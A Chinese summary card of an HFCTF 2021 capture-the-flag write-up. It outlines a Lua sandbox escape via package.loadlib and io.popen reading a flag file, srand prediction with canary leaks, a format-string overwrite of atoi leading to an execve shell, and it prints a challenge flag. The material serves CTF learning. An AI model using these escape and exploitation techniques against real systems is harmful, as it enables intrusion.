---
title: "虎符-WriteUp"
category: pwn
tags: ["虎符 CTF", "pwn", "ChaMd5-Venom", "IO_Popen-RCE", "Lua-sandbox-escape", "IO_loadlib"]
signals: ["虎符 CTF 2021", "ChaMd5-Venom", "IO_Popen-RCE", "Lua-sandbox-escape", "IO_loadlib", "package-loadlib", "Bulls-Cows-game", "srand-predict", "canary-leak", "crypto_hash", "CTF", "WriteUp", "ChaMd5", "Venom"]
difficulty: medium
source: "https://www.ctfiot.com/31538.html"
tools: ["ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 虎符-WriteUp

> 赛事：虎符 CTF 2021 | 方向：pwn | 难度：medium | 工具：ROP

## 一句话总结

虎符CTF WriteUp,ChaMd5 Venom招新+俄文密码翻译+Lua沙箱逃逸(package.loadlib+io.popen)+Bulls-Cows猜数字算法+srand预测+fmtstr覆盖atoi。

## 攻击链

1. 招新文:ChaMd5 Venom招IOT+工控+样本分析
2. Crypto翻译题:dOBRO POVALOWATX NA MAT(俄文)→英文→flag=HFCTF{c0d3735f-4062-4f39-9ad6-9e7df7994dad}
3. Lua沙箱逃逸:INFO n EVAL payload + local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io") + io.popen("cat /flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG", "r")
4. Bulls-Cows猜数字:6步+4位不重复+不含0+suggestedNum选择最大排除
5. PWN srand预测:lib.srand(0x1111111111111111)+send 0x109*'\x11'+泄漏canary/stack
6. fmtstr:fmtstr_payload(6, {stack-536: 0x3e})覆盖atoi为one_gadget
7. execve(59)+/bin/sh payload

## 关键 payload

```
HFCTF{c0d3735f-4062-4f39-9ad6-9e7df7994dad}
```

## 经验教训

虎符CTF质量较高,涵盖多方向:语言学翻译(俄文)+Lua沙箱逃逸(loadlib+io.popen)+Bulls-Cows信息论算法+srand固定seed预测+fmtstr改atoi。

## 标签

ChaMd5-Venom、IO_Popen-RCE、Lua-sandbox-escape、IO_loadlib、package-loadlib、Bulls-Cows-game、srand-predict、canary-leak、fmtstr-overwrite、ROP-execve

## 参考来源

- https://www.ctfiot.com/31538.html
- 原文件：虎符-WriteUp.full.md
